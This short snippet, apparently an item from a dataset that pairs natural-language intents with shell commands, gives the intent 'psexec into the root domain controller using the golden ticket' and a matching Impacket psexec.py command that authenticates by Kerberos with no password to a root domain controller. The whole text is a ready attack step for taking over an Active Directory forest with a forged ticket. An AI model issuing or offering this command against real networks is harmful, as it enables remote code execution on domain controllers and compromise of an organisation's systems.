# Natural language intent:
# psexec into the root domain controller using the golden ticket

psexec.py < child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
